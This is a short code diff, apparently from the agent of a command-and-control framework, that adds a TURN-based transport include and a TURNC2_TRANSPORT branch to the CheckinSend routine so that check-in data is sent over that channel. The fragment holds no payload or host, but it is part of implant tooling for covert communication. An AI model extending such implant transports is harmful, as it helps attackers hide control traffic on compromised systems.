@@ -4,6 +4,7 @@
 
 #include "TransportSmb.h"
 #include "TransportTcp.h"
+#include "TransportTurn.h"
 
 #include <lm.h>
 #include <lmwksta.h>
@@ -214,6 +215,12 @@ BOOL CheckinSend()
     PARSER Output = { 0 };
 
 #ifdef HTTPX_TRANSPORT
+
+    PackageSend(CheckinData, &Output);
+
+#endif
+
+#ifdef TURNC2_TRANSPORT
 
     PackageSend(CheckinData, &Output);
 
